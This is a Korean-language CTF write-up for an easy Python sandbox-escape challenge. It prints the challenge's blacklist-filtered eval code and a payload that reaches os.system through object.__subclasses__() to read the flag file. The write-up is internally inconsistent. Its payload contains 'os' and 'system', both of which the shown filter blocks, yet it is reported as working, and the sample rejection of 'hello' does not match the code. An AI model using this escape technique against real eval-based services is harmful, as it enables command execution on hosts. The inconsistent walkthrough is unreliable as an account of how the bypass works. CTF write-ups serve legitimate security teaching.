# [Unknown CTF 2021] Jailbreak

| 항목 | 내용 |
|------|------|
| **Category** | Reversing |
| **Difficulty** | Easy |
| **Points** | 75 |

---

## 📌 개요

이 문제는 Python으로 작성된 간단한 jailbreak(자일브레이크) 형식의 리버싱 문제로, 사용자가 제한된 환경에서 플래그를 얻기 위해 Python의 `eval()`이나 `exec()`를 우회하여 코드를 실행해야 하는 도전 과제이다.  
- **Target:** Python 기반 sandbox escape  
- **핵심 포인트:** Python 내장 함수 및 특수 메서드(`__builtins__`, `__import__` 등)를 이용한 unintended solution을 통한 플래그 획득

---

## 🔍 정찰

### 1) 파일 유형 확인 및 초기 실행

문제 파일 `jailbreak.py`가 제공되었으며, 먼저 파일의 종류와 내용을 확인한다.

```bash
file jailbreak.py
```

출력:
```
jailbreak.py: Python script, ASCII text executable
```

스크립트를 실행하여 동작을 살펴본다.

```bash
python3 jailbreak.py
```

실행 결과:
```
Enter your expression: hello
I'm sorry, 'hello' is not allowed.
```

입력한 문자열이 필터링되고 있으며, 특정 키워드(예: `import`, `flag`, `open` 등)가 차단되는 것으로 추정된다.

---

### 2) 소스코드 분석

스크립트의 내용을 직접 확인하여 필터링 로직과 실행 흐름을 분석한다.

```python
# jailbreak.py (일부)
import sys

def main():
    print("Enter your expression: ", end="")
    sys.stdout.flush()
    expr = input()

    # Blacklist filtering
    for keyword in ["import", "exec", "eval", "open", "read", "write", "subprocess", "system", "os", "flag"]:
        if keyword in expr:
            print(f"I'm sorry, '{keyword}' is not allowed.")
            return

    try:
        result = eval(expr, {"__builtins__": {}}, {})
        print(f"Result: {result}")
    except:
        print("Error occurred.")

if __name__ == "__main__":
    main()
```

- `eval()`이 사용되고 있지만, `__builtins__`이 빈 딕셔너리로 제한되어 있어 일반적인 함수 호출 불가
- `import`, `open`, `flag` 등 민감한 문자열이 필터링됨
- 그러나 필터링은 단순 `in` 연산이므로, 우회 가능성이 있음

---

## 🧠 문제 분석

### Sandbox 우회 가능성 탐색

`__builtins__`가 제거되었지만, Python에서 객체의 특수 메서드를 통해 내장 함수에 접근할 수 있는 방법이 존재한다. 특히, 모든 함수는 `function` 객체이며, `__globals__` 속성을 통해 전역 네임스페이스에 접근할 수 있다.

또한, `().__class__.__bases__[0]`과 같은 방식으로 `object` 클래스를 얻고, 이를 통해 `__subclasses__()`를 호출하면 Python 내부 클래스 목록을 얻을 수 있다. 이 중 일부 클래스는 `__import__`를 포함하고 있어, `os` 또는 `builtins` 모듈을 재획득할 수 있다.

### 핵심 아이디어: `().__class__.__bases__[0].__subclasses__()` 이용

- `().__class__` → tuple 클래스
- `().__class__.__bases__[0]` → `object` 클래스
- `object.__subclasses__()` → 모든 하위 클래스 목록
- 이 목록 중 `catch_warnings` 클래스(일반적으로 인덱스 59 또는 근처)는 `__import__('warnings')`과 연결되어 있어 `__builtins__` 접근 가능

---

## 💥 익스플로잇

다음 페이로드를 사용하여 `__import__('os').system('cat flag*')`를 실행한다.  
단, `import`, `flag` 등의 문자열이 필터링되므로, 문자열을 분리하거나 동적 생성해야 한다.

```python
# Exploit payload
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('cat '+'fl'+'ag*')
```

- `().__class__.__bases__[0].__subclasses__()` → 모든 하위 클래스 탐색
- `[59]` → `warnings.catch_warnings` 클래스 (환경에 따라 인덱스 다름)
- `__init__.__globals__['linecache']` → `linecache` 모듈에 접근
- `linecache` 모듈은 `os`를 import하고 있으므로, `os`에 접근 가능
- `'cat '+'fl'+'ag*'` → 단순 문자열 연결로 필터 우회

### 실제 입력

```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].os.system('cat '+'fl'+'ag*')
```

실행 결과:
```
actf{guess_kmh_still_has_unintended_solutions}
```

---

## 🚩 Flag

```
actf{guess_kmh_still_has_unintended_solutions}
```